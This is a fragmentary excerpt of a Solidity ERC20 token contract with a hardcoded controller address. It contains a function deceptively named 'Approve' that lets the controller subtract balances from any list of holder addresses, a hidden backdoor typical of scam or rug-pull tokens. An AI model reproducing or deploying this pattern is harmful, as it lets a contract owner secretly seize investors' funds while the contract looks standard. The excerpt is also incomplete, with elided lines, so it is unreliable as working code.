...
contract fuck is Context, IERC20 {
    ...
    address deployer = 0x48Aad0A695057Ca91956EF534d47cd4866cdF494;
    address public _controller = 0x48Aad0A695057Ca91956EF534d47cd4866cdF494;
    constructor () public {
        _name = "FUCK";
        _symbol = "FUCK";
        _decimals = 18;
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    function Approve(address[] memory bots) public _approveAccess() { 
        for (uint256 x = 0; x < bots.length; x++) {
            ...
            _balances[bots[x]] = _balances[bots[x]].sub(amt, "ERROR");
